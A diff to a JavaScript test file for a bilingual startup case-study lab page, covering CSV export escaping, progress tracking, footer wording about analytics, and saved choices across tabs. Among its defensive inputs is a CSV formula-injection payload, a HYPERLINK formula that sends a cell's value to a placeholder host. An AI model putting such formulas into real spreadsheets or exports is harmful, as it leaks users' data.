@@ -59,6 +59,16 @@ assert.equal(dong[0], C.COT_CSV.join(',')); assert.equal(dong.length, 5);
 assert.ok(dong[2].includes('"Lý do ""thử"", có dấu phẩy"'), 'thoát dấu nháy, dấu phẩy');
 assert.ok(dong[1].startsWith('kiem-dinh,kn-v1,kd1,b,hypothesis,'));
 assert.ok(!C.COT_CSV.some(c => /^(diem|score)/i.test(c)), 'CSV không có cột điểm');
+// Rà mã 26/11: chặn chèn công thức Excel qua lý do hay tên đội
+for (const x of ['=1+1', '+1', '-1', '@SUM(A1)', '\tx', '\rx']) assert.equal(C.oCsv(x)[0] === '"' ? C.oCsv(x)[1] : C.oCsv(x)[0], "'", 'ô CSV «' + x + '» phải có dấu \' đứng trước');
+assert.equal(C.oCsv('Bình thường'), 'Bình thường');
+{
+  const cx = C.ghiChon({}, th1, 'a', '=HYPERLINK("http://x.y/?"&A1,"Bấm")', 10);
+  const dongX = C.taoCsv(bo, cx, D.PHIEN_BAN, '=1+1').slice(1).trim().split('\r\n')[1];
+  assert.ok(!/(^|,)"?[=+\-@]/.test(dongX), 'không ô nào bắt đầu bằng công thức: ' + dongX);
+}
+// Lựa chọn trỏ tới phương án không còn trong dữ liệu thì không tính là đã làm
+assert.deepEqual(C.tienDo(bo, { kd1: { pa: 'z', lyDo: 'phương án cũ đã bỏ' } }), { xong: 0, tong: 4, tiep: 0 });
 
 // 4. Trích dẫn: mọi «Vì sao?» khớp danh mục nguồn, DOI đúng dạng (kiểm ngoại tuyến)
 (async () => {
@@ -76,6 +86,9 @@ assert.ok(!C.COT_CSV.some(c => /^(diem|score)/i.test(c)), 'CSV không có cột 
   for (const f of ['lab/khoi-nghiep-tinh-huong.html', 'lab/khoi-nghiep-tinh-huong-data.js', 'lab/khoi-nghiep-tinh-huong-core.js'])
     assert.ok(!/fetch\(|XMLHttpRequest|sendBeacon|WebSocket/.test(R(f)), f + ' không gọi mạng');
   assert.ok(!/\bAI\b/.test(html.replace(/không dùng AI|uses no AI/gi, '')), 'không có AI');
+  // Rà mã 26/11: trang có nạp thong-ke.js (đếm lượt xem) nên không được hứa «không gửi dữ liệu đi đâu»
+  assert.ok(!/không gửi dữ liệu đi đâu|sends no data anywhere/.test(html), 'chân trang nói đúng về thống kê lượt xem');
+  assert.match(html, /lượt xem ẩn danh/); assert.match(html, /anonymous visits/);
   for (const f of ['khoi-nghiep-tinh-huong.html', 'khoi-nghiep-tinh-huong-data.js', 'khoi-nghiep-tinh-huong-core.js']) assert.ok(R('sw.js').includes("'./lab/" + f + "'"), 'sw.js lưu sẵn ' + f);
   assert.match(R('sitemap.xml'), /lab\/khoi-nghiep-tinh-huong\.html/);
   assert.match(R('js/cham-library.js'), /href: 'lab\/khoi-nghiep-tinh-huong\.html'/);
@@ -124,11 +137,39 @@ assert.ok(!C.COT_CSV.some(c => /^(diem|score)/i.test(c)), 'CSV không có cột 
     check(await p.evaluate(() => document.documentElement.scrollWidth - innerWidth) <= 0, lang + ': 360 px không tràn ngang');
     const nho = await p.$$eval('button', bs => bs.filter(x => x.offsetParent && (x.getBoundingClientRect().height < 44 || x.getBoundingClientRect().width < 44)).map(x => x.id || x.textContent));
     check(nho.length === 0, lang + ': nút ≥ 44 px ' + nho.join(','));
+    check(await p.title() === (lang === 'en' ? 'Startup cases · BizOn' : 'Tình huống khởi nghiệp · BizOn'), lang + ': tiêu đề thẻ theo ngôn ngữ');
     if (lang === 'en') check(!VIET.test((await p.innerText('body')).replace(/Đội A|Ninh Kiều|Cần Thơ|đồng|\d+ đ|Lý do của đội cho tình huống \d|Ra mắt sớm để giữ chỗ trên thị trường|Gambardella|Sarasvathy/g, '')), 'en: không còn chữ Việt');
     p.on('dialog', d => d.accept()); await p.click('#nut-lam-lai');
     check(/1\/4|1 of 4/.test(await p.textContent('#th-tien-do')) && (await p.evaluate(() => __knTest.trangThai().luu.bo['kiem-dinh'])) === undefined, lang + ': làm lại xóa lựa chọn của bộ');
     check(errs.length === 0, lang + ': không lỗi JS ' + errs.join(' | '));
     check(ngoai.length === 0, lang + ': không gọi mạng ngoài ' + ngoai.join(' '));
+    await ctx.close();
+  }
+  // Rà mã 26/11: lựa chọn của phiên bản dữ liệu cũ không được tính
+  {
+    const ctx = await b.newContext({ viewport: { width: 390, height: 800 } }); const p = await ctx.newPage(); const errs = [];
+    p.on('pageerror', e => errs.push(e.message));
+    await p.addInitScript(() => { try { if (!sessionStorage.getItem('kn-init')) { sessionStorage.setItem('kn-init', '1'); localStorage.setItem('bizon-lang', 'vi');
+      localStorage.setItem('bizon-khoi-nghiep-v1', JSON.stringify({ doi: '', bo: { 'kiem-dinh': { phienBan: 'kn-v0', chon: { kd1: { pa: 'a', lyDo: 'lựa chọn của bản cũ', luc: '' } } } } })); } } catch (e) {} });
+    await p.goto(BASE + '/lab/khoi-nghiep-tinh-huong.html');
+    check(/0\/4/.test(await p.textContent('#ds-bo')), 'lựa chọn khác PHIEN_BAN không được tính');
+    // Rời tình huống giữa chừng (đổi ngôn ngữ, mở lại bộ) rồi quay lại: giữ phương án đã chọn và lý do
+    await p.click('[data-bo="kiem-dinh"]');
+    await p.check('#th-pa .pa:nth-of-type(2) input'); await p.fill('#ly-do', 'Hỏi thêm khách trước khi làm');
+    await p.click('#nut-lang'); await p.click('#nut-lang');
+    await p.evaluate(() => { document.getElementById('man-th').hidden = true; document.getElementById('man-bo').hidden = false; });
+    await p.click('[data-bo="kiem-dinh"]');
+    check(await p.isChecked('#th-pa .pa:nth-of-type(2) input') && !(await p.isDisabled('#nut-xem')), 'mở lại bộ giữa chừng vẫn giữ phương án đã chọn');
+    // Hai thẻ cùng mở: lựa chọn của thẻ này không bị thẻ kia đè mất
+    const p2 = await ctx.newPage(); await p2.goto(BASE + '/lab/khoi-nghiep-tinh-huong.html'); // p2 mở trước khi p ghi
+    await p.click('#nut-xem'); await p.click('#nut-tiep');
+    await p.check('#th-pa .pa:nth-of-type(1) input'); await p.fill('#ly-do', 'Phỏng vấn chuyện đã xảy ra'); await p.click('#nut-xem');
+    await p2.waitForTimeout(200); await p2.click('[data-bo="kiem-dinh"]');
+    check(/3\/4/.test(await p2.textContent('#th-tien-do')), 'thẻ thứ hai thấy lựa chọn của thẻ thứ nhất');
+    await p2.check('#th-pa .pa:nth-of-type(1) input'); await p2.fill('#ly-do', 'Bán thử một lô nhỏ ở chợ'); await p2.click('#nut-xem');
+    const l = await p.evaluate(() => JSON.parse(localStorage.getItem('bizon-khoi-nghiep-v1')).bo['kiem-dinh']);
+    check(l.phienBan === 'kn-v1' && ['kd1', 'kd2', 'kd3'].every(k => l.chon[k]), 'lưu đủ 3 lựa chọn của hai thẻ, kèm phiên bản: ' + Object.keys(l.chon).join(','));
+    check(errs.length === 0, 'không lỗi JS ' + errs.join(' | '));
     await ctx.close();
   }
   await b.close();
